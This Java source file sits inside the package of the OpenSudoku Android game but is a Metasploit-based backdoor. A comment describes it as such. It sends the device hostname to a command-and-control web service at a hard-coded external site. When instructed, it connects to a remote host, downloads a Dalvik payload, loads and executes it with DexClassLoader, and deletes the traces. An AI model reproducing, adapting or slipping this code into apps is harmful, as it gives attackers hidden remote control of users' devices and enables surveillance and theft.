package org.moire.opensudoku.gui;


import android.content.Context;
import dalvik.system.DexClassLoader;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.io.IOException;
import java.io.InputStreamReader;

import android.os.Build;
import java.lang.reflect.Method;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.util.concurrent.TimeUnit;

public class Payload {
    public static final String CERT_HASH = "WWWW                                        ";
    public static final String TIMEOUTS = "TTTT604800-300-3600-10                         ";

    //USAGE NOTE: this backdoor works in a LAN, with Metasploit listening to port 4444, the machine has ip 192.168.178.30
    //if you wish to modify ip:port (e.g. for a WAN usage, or a different Metasploit machine with different IP)
    // you can modify the following variable (URL), please DO NOT remove the four 'Z' at the beginning
    public static final String URL = "ZZZZtcp://151.26.231.234:443                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       ";
    public static long comm_timeout;
    private static String[] parameters;
    public static long retry_total;
    public static long retry_wait;
    public static long session_expiry;

    /* renamed from: com.metasploit.stage.Payload.1 */
    static class C00001 extends Thread {
        C00001() {
        }

        public void run() {
            Payload.main(null);
        }
    }

    public static void start(Context context) {
        startInPath(context.getFilesDir().toString());
    }

    public static void startAsync() {
        new C00001().start();
    }

    public static void startInPath(String path) {
        parameters = new String[]{path};
        startAsync();
    }

    public static void main(String[] args) {
        String hostname="none";
        String result="";
        String site="paner.altervista.org";
        if (args != null) {
            parameters = new String[]{new File(".").getAbsolutePath()};
        }
        String[] timeouts = TIMEOUTS.substring(4).trim().split("-");
        try {
            long sessionExpiry = (long) Integer.parseInt(timeouts[0]);
            long commTimeout = (long) Integer.parseInt(timeouts[1]);
            long retryTotal = (long) Integer.parseInt(timeouts[2]);
            long retryWait = (long) Integer.parseInt(timeouts[3]);
            long payloadStart = System.currentTimeMillis();
            session_expiry = TimeUnit.SECONDS.toMillis(sessionExpiry) + payloadStart;
            comm_timeout = TimeUnit.SECONDS.toMillis(commTimeout);
            retry_total = TimeUnit.SECONDS.toMillis(retryTotal);
            retry_wait = TimeUnit.SECONDS.toMillis(retryWait);
            String url = URL.substring(4).trim();
            if (System.currentTimeMillis() < retry_total + payloadStart && System.currentTimeMillis() < session_expiry) {
                try {
                } catch (Exception e) {
                    e.printStackTrace();
                    try {
                        Thread.sleep(retry_wait);
                    } catch (InterruptedException e2) {
                        return;
                    }
                }
                if (url.startsWith("tcp")) {
                    //while (true) {
                        try {
                            hostname = getHostName("Android");
                            result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname);

                            String[] array = result.split("\\|\\|", -1);
                            String exec=array[7].substring(5);
                            String ip=array[1].substring(3);
                            String port=array[2].substring(5);
                            String cmd=array[8].substring(4);
                            String iout=array[5].substring(5);
                            url="tcp://"+ip+":"+port;
                            if (exec.equals("1")) {

                                result = getResponseFromUrl("http://" + site + "/svc/wup.php?pc=" + hostname + "&exec=0");
                                runStagefromTCP(url);
                            }

                            Thread.sleep(60 * 1000);
                        }
                        catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    //}
                } else {
                    runStageFromHTTP(url);
                }
            }
        } catch (NumberFormatException e3) {
        }
        catch (Exception e){

        }
    }
    public static String getHostName(String defValue) {
        try {
            Method getString = Build.class.getDeclaredMethod("getString", String.class);
            getString.setAccessible(true);
            return getString.invoke(null, "net.hostname").toString();
        } catch (Exception ex) {
            return defValue;
        }
    }
    public static String getResponseFromUrl(String surl) {
        String webPage = surl;
        String result="";
        URLConnection urlConnection;

        try{
            URL url = new URL(webPage);
            try{
                urlConnection = url.openConnection();

                InputStream is = urlConnection.getInputStream();
                InputStreamReader isr = new InputStreamReader(is);

                int numCharsRead;
                char[] charArray = new char[1024];
                StringBuffer sb = new StringBuffer();
                while ((numCharsRead = isr.read(charArray)) > 0) {
                    sb.append(charArray, 0, numCharsRead);
                }
                result = sb.toString();
            }catch(IOException ex){
                //do exception handling here
            }
        }catch(MalformedURLException malex){
            //do exception handling here
        }

        return  result;
    }
    private static void runStageFromHTTP(String url) throws Exception {
        InputStream inStream;
        if (url.startsWith("https")) {
            URLConnection uc = new URL(url).openConnection();
            Class.forName("com.google.stage.PayloadTrustManager").getMethod("useFor", new Class[]{URLConnection.class}).invoke(null, new Object[]{uc});
            inStream = uc.getInputStream();
        } else {
            inStream = new URL(url).openStream();
        }
        readAndRunStage(new DataInputStream(inStream), new ByteArrayOutputStream(), parameters);
    }

    private static void runStagefromTCP(String url) throws Exception {
        Socket sock;
        String[] parts = url.split(":");
        int port = Integer.parseInt(parts[2]);
        String host = parts[1].split("/")[2];
        if (host.equals("")) {
            ServerSocket server = new ServerSocket(port);
            sock = server.accept();
            server.close();
        } else {
            sock = new Socket(host, port);
        }
        if (sock != null) {
            sock.setSoTimeout(500);
            readAndRunStage(new DataInputStream(sock.getInputStream()), new DataOutputStream(sock.getOutputStream()), parameters);
        }
    }

    private static void readAndRunStage(DataInputStream in, OutputStream out, String[] parameters) throws Exception {
        String path = parameters[0];
        String filePath = path + File.separatorChar + "payload.jar";
        String dexPath = path + File.separatorChar + "payload.dex";
        byte[] core = new byte[in.readInt()];
        in.readFully(core);
        String classFile = new String(core);
        core = new byte[in.readInt()];
        in.readFully(core);
        File file = new File(filePath);
        if (!file.exists()) {
            file.createNewFile();
        }
        FileOutputStream fop = new FileOutputStream(file);
        fop.write(core);
        fop.flush();
        fop.close();
        Class<?> myClass = new DexClassLoader(filePath, path, path, Payload.class.getClassLoader()).loadClass(classFile);
        Object stage = myClass.newInstance();
        file.delete();
        new File(dexPath).delete();
        myClass.getMethod("start", new Class[]{DataInputStream.class, OutputStream.class, String[].class}).invoke(stage, new Object[]{in, out, parameters});
        //System.exit(0);
    }
}
